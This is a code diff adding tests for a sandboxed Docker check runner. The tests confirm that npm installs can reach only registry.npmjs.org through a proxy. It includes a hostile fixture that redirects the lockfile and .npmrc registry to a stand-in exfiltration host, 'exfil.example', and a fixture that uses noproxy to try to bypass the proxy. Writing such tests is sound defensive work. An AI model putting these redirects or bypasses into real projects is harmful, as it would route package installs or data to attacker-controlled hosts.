@@ -221,6 +221,87 @@ describe.skipIf(!IMAGE)("dockerCheckRunner on Docker", () => {
 		expect([res?.outcome, res?.output.trim()]).toEqual(["pass", PINNED_PNPM]);
 	});
 
+	// The install's network (SANDBOX.md H2): the registry, and nothing else.
+	const lockedOn = (resolved: string) =>
+		`${JSON.stringify(
+			{
+				name: "locked",
+				version: "1.0.0",
+				lockfileVersion: 3,
+				requires: true,
+				packages: {
+					"": {
+						name: "locked",
+						version: "1.0.0",
+						dependencies: { "is-number": "7.0.0" },
+					},
+					"node_modules/is-number": {
+						version: "7.0.0",
+						resolved,
+						integrity:
+							"sha512-41Cifkg6e8TylSpdtTpeLVMqvSBEVzTttHvERD741+pnZ8ANv0004MRL43QKPDlK9cGvNp6NZWZUBlbGXYxxng==",
+					},
+				},
+			},
+			null,
+			2,
+		)}\n`;
+	const lockedPkg = `${JSON.stringify({
+		name: "locked",
+		version: "1.0.0",
+		private: true,
+		dependencies: { "is-number": "7.0.0" },
+	})}\n`;
+	const REGISTRY_TGZ =
+		"https://registry.npmjs.org/is-number/-/is-number-7.0.0.tgz";
+
+	it("installs a dependency from the registry, through the install's proxy", async () => {
+		const r = repo({
+			"package.json": lockedPkg,
+			"package-lock.json": lockedOn(REGISTRY_TGZ),
+		});
+		const [res] = await runner().run(
+			request(r.dir, r.commits[0] as string, [
+				check("test -f node_modules/is-number/index.js"),
+			]),
+		);
+		expect(res?.outcome, res?.output).toBe("pass");
+	});
+
+	it("refuses an install that reaches for any other host, and says what it refused", async () => {
+		const r = repo({
+			"package.json": lockedPkg,
+			"package-lock.json": lockedOn(
+				"https://exfil.example/brief-text/is-number-7.0.0.tgz",
+			),
+			".npmrc": "registry=https://exfil.example/\n",
+		});
+		const [res] = await runner().run(
+			request(r.dir, r.commits[0] as string, [check("true")]),
+		);
+		expect(res?.outcome).toBe("error");
+		expect(res?.output).toContain(
+			"The install may reach only registry.npmjs.org",
+		);
+		expect(res?.output).toContain("refused exfil.example:443");
+		expect(leftover()).toBe("");
+	});
+
+	it("gives an install that turns the proxy off no way out, even to the registry", async () => {
+		const r = repo({
+			"package.json": lockedPkg,
+			"package-lock.json": lockedOn(REGISTRY_TGZ),
+			// npm reads no wildcard here: the host itself skips the proxy.
+			".npmrc": "noproxy=registry.npmjs.org\n",
+		});
+		const [res] = await runner().run(
+			request(r.dir, r.commits[0] as string, [check("true")]),
+		);
+		expect(res?.outcome).toBe("error");
+		expect(res?.output).toMatch(/The install failed/);
+		expect(res?.output).toMatch(/EAI_AGAIN|ENETUNREACH/);
+	});
+
 	it("keeps only the end of a check's output, however much it prints", async () => {
 		const r = repo({ "a.txt": "a\n" });
 		const run = dockerCheckRunner({
